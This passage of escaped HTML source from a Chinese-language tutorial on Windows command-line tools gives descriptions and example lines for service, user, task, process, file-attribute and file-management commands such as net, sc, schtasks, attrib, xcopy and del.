&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：管理网络资源和服务。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>net start [服务名]&lt;/code>：启动服务。&lt;/li>
&lt;li>&lt;code>net stop [服务名]&lt;/code>：停止服务。&lt;/li>
&lt;li>&lt;code>net user [用户名] [密码] /add&lt;/code>：创建用户。&lt;/li>
&lt;li>&lt;code>net localgroup [组名] [用户名] /add&lt;/code>：将用户添加到组。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net start wuauserv
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user mz &lt;span class="m">1234&lt;/span> /add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net localgroup administrators mz /add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="23-sc">2.3 &lt;code>sc&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：管理服务。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>sc start [服务名]&lt;/code>：启动服务。&lt;/li>
&lt;li>&lt;code>sc stop [服务名]&lt;/code>：停止服务。&lt;/li>
&lt;li>&lt;code>sc create [服务名] binPath=[路径]&lt;/code>：创建服务。&lt;/li>
&lt;li>&lt;code>sc delete [服务名]&lt;/code>：删除服务。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sc start MyService
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sc create NewService &lt;span class="nv">binPath&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;C:\path\to\service.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sc delete OldService
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="3-系统管理与任务调度">3. 系统管理与任务调度
&lt;/h2>&lt;h3 id="31-tasklist">3.1 &lt;code>tasklist&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示系统进程。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>tasklist&lt;/code>：显示所有进程。&lt;/li>
&lt;li>&lt;code>tasklist /svc&lt;/code>：显示svchost.exe提供的服务。&lt;/li>
&lt;li>&lt;code>tasklist /m [模块名]&lt;/code>：显示调用指定模块的进程。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tasklist /svc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tasklist /m shell32.dll
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="32-taskkill">3.2 &lt;code>taskkill&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：终止进程。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>taskkill /PID [进程ID]&lt;/code>：根据进程ID终止进程。&lt;/li>
&lt;li>&lt;code>taskkill /IM [进程名]&lt;/code>：根据进程名终止进程。&lt;/li>
&lt;li>&lt;code>taskkill /F /IM [进程名]&lt;/code>：强制终止进程。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">taskkill /IM notepad.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">taskkill /F /IM notepad.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="33-schtasks">3.3 &lt;code>schtasks&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：管理计划任务。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>/create&lt;/code>：创建任务。&lt;/li>
&lt;li>&lt;code>/query&lt;/code>：查询任务。&lt;/li>
&lt;li>&lt;code>/change&lt;/code>：更改任务。&lt;/li>
&lt;li>&lt;code>/delete&lt;/code>：删除任务。&lt;/li>
&lt;li>&lt;code>/run&lt;/code>：运行任务。&lt;/li>
&lt;li>&lt;code>/end&lt;/code>：中止任务。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">schtasks /create /tn &lt;span class="s2">&amp;#34;MyTask&amp;#34;&lt;/span> /tr &lt;span class="s2">&amp;#34;C:\Path\To\MyProgram.exe&amp;#34;&lt;/span> /sc daily /st 08:00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">schtasks /run /tn &lt;span class="s2">&amp;#34;MyTask&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">schtasks /delete /tn &lt;span class="s2">&amp;#34;MyTask&amp;#34;&lt;/span> /f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="4-文件系统与安全">4. 文件系统与安全
&lt;/h2>&lt;h3 id="41-fsutil">4.1 &lt;code>fsutil&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：管理文件系统。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>fsutil fsinfo volumeinfo [驱动器]&lt;/code>：查询驱动器信息。&lt;/li>
&lt;li>&lt;code>fsutil volume diskfree [驱动器]&lt;/code>：显示驱动器空间信息。&lt;/li>
&lt;li>&lt;code>fsutil file createnew [路径] [大小]&lt;/code>：创建新文件。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fsutil fsinfo volumeinfo C:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fsutil file createnew C:&lt;span class="se">\t&lt;/span>est.txt &lt;span class="m">1024&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="42-attrib">4.2 &lt;code>attrib&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：查看和修改文件属性。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>+h&lt;/code>：隐藏文件。&lt;/li>
&lt;li>&lt;code>-h&lt;/code>：取消隐藏。&lt;/li>
&lt;li>&lt;code>+r&lt;/code>：设置只读属性。&lt;/li>
&lt;li>&lt;code>-r&lt;/code>：取消只读属性。&lt;/li>
&lt;li>&lt;code>+s&lt;/code>：设置系统文件属性。&lt;/li>
&lt;li>&lt;code>-s&lt;/code>：取消系统文件属性。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">attrib +h C:&lt;span class="se">\t&lt;/span>est.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">attrib -r C:&lt;span class="se">\t&lt;/span>est.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="43-sfc">4.3 &lt;code>sfc&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：扫描并修复系统文件。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>sfc /scannow&lt;/code>：扫描并修复损坏的系统文件。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sfc /scannow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="5-其他实用命令">5. 其他实用命令
&lt;/h2>&lt;h3 id="51-set">5.1 &lt;code>set&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示、设置或删除环境变量。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> &lt;span class="nv">VAR_NAME&lt;/span>&lt;span class="o">=&lt;/span>value
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> &lt;span class="nv">VAR_NAME&lt;/span>&lt;span class="o">=&lt;/span>new_value
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="52-assoc">5.2 &lt;code>assoc&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：查看和修改文件扩展名关联。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">assoc .txt&lt;span class="o">=&lt;/span>txtfile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">assoc .txt&lt;span class="o">=&lt;/span>htmlfile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="6-高级网络管理">6. 高级网络管理
&lt;/h2>&lt;h3 id="61-net-time">6.1 &lt;code>net time&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：查询远程主机的时间。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net &lt;span class="nb">time&lt;/span> &lt;span class="se">\\&lt;/span>192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="62-net-user-和-net-localgroup">6.2 &lt;code>net user&lt;/code> 和 &lt;code>net localgroup&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>net user [用户名] [密码] /add&lt;/code>：创建用户。&lt;/li>
&lt;li>&lt;code>net user [用户名] /del&lt;/code>：删除用户。&lt;/li>
&lt;li>&lt;code>net user [用户名] /active:no/yes&lt;/code>：启用或禁用用户。&lt;/li>
&lt;li>&lt;code>net localgroup [组名] [用户名] /add&lt;/code>：将用户添加到组。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net user mz &lt;span class="m">1234&lt;/span> /add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user mz /del
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net localgroup administrators mz /add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="63-net-start-和-net-stop">6.3 &lt;code>net start&lt;/code> 和 &lt;code>net stop&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>net start [服务名]&lt;/code>：启动服务。&lt;/li>
&lt;li>&lt;code>net stop [服务名]&lt;/code>：停止服务。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net start wuauserv
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net stop wuauserv
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="7-文件与目录管理基础命令">7. 文件与目录管理基础命令
&lt;/h2>&lt;h3 id="71-dir">7.1 &lt;code>dir&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：列出目录内容和文件属性。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>dir&lt;/code>：显示当前目录的文件和文件夹。&lt;/li>
&lt;li>&lt;code>dir /a&lt;/code>：显示包括隐藏文件和系统文件在内的所有文件。&lt;/li>
&lt;li>&lt;code>dir /s&lt;/code>：递归显示所有子目录中的文件。&lt;/li>
&lt;li>&lt;code>dir /b&lt;/code>：只显示文件名，不显示其他信息。&lt;/li>
&lt;li>&lt;code>dir /o:n&lt;/code>：按名称排序。&lt;/li>
&lt;li>&lt;code>dir /o:s&lt;/code>：按大小排序。&lt;/li>
&lt;li>&lt;code>dir /o:d&lt;/code>：按日期排序。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dir /a /s C:&lt;span class="se">\W&lt;/span>indows
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dir *.txt /b /s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dir /o:s
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="72-cdchange-directory">7.2 &lt;code>cd&lt;/code>（Change Directory）
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：切换当前目录。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>cd [路径]&lt;/code>：切换到指定路径。&lt;/li>
&lt;li>&lt;code>cd..&lt;/code>：返回上一级目录。&lt;/li>
&lt;li>&lt;code>cd\&lt;/code>：返回到根目录。&lt;/li>
&lt;li>&lt;code>cd /d D:&lt;/code>：切换到其他驱动器。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> C:&lt;span class="se">\P&lt;/span>rogram Files
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cd..
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cd&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>&lt;span class="nb">cd&lt;/span> /d D:&lt;span class="se">\D&lt;/span>ocuments
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="73-mdmkdir">7.3 &lt;code>md/mkdir&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：创建目录。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">md NewFolder
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkdir &lt;span class="s2">&amp;#34;My Documents&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkdir C:&lt;span class="se">\P&lt;/span>ath&lt;span class="se">\T&lt;/span>o&lt;span class="se">\N&lt;/span>ewFolder
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="74-rdrmdir">7.4 &lt;code>rd/rmdir&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：删除目录。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>rd [目录名]&lt;/code>：删除指定的空目录。&lt;/li>
&lt;li>&lt;code>rd /s [目录名]&lt;/code>：递归删除指定目录及其所有子目录和文件。&lt;/li>
&lt;li>&lt;code>rd /q [目录名]&lt;/code>：安静模式，不提示确认。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rd EmptyFolder
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rd /s /q FullFolder
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="75-copy">7.5 &lt;code>copy&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：复制文件。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>copy [源文件] [目标文件]&lt;/code>：将源文件复制到目标位置。&lt;/li>
&lt;li>&lt;code>copy [源文件1]+[源文件2] [目标文件]&lt;/code>：合并多个文件。&lt;/li>
&lt;li>&lt;code>copy /y [源文件] [目标文件]&lt;/code>：不提示确认覆盖。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">copy file.txt D:&lt;span class="se">\b&lt;/span>ackup.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">copy file1.txt+file2.txt combined.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">copy /y source.txt destination.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="76-xcopy">7.6 &lt;code>xcopy&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：增强版的文件复制命令，支持目录树复制。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>xcopy [源] [目标] /e&lt;/code>：复制包括空目录在内的目录和子目录。&lt;/li>
&lt;li>&lt;code>xcopy [源] [目标] /s&lt;/code>：复制目录和子目录，但不包括空目录。&lt;/li>
&lt;li>&lt;code>xcopy [源] [目标] /h&lt;/code>：包括隐藏文件和系统文件。&lt;/li>
&lt;li>&lt;code>xcopy [源] [目标] /d:日期&lt;/code>：只复制在指定日期或之后更改的文件。&lt;/li>
&lt;li>&lt;code>xcopy [源] [目标] /y&lt;/code>：不提示确认覆盖。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">xcopy C:&lt;span class="se">\S&lt;/span>ourceFolder D:&lt;span class="se">\D&lt;/span>estFolder /e /h /y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">xcopy *.doc D:&lt;span class="se">\B&lt;/span>ackup /s
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="77-move">7.7 &lt;code>move&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：移动文件或重命名文件/目录。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>move [源文件] [目标文件]&lt;/code>：移动文件或重命名文件。&lt;/li>
&lt;li>&lt;code>move /y [源文件] [目标文件]&lt;/code>：不提示确认覆盖。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">move file.txt D:&lt;span class="se">\N&lt;/span>ewLocation&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>move OldName.txt NewName.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">move OldFolder NewFolder
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="78-delerase">7.8 &lt;code>del/erase&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：删除文件。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>del [文件名]&lt;/code>：删除指定文件。&lt;/li>
&lt;li>&lt;code>del /f [文件名]&lt;/code>：强制删除只读文件。&lt;/li>
&lt;li>&lt;code>del /s [目录]&lt;/code>：删除指定目录及其所有子目录中的指定文件。&lt;/li>
&lt;li>&lt;code>del /q [文件名]&lt;/code>：安静模式，不提示确认。&lt;/li>
&lt;li>&lt;code>del /a:[属性] [文件名]&lt;/code>：根据文件属性删除文件。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
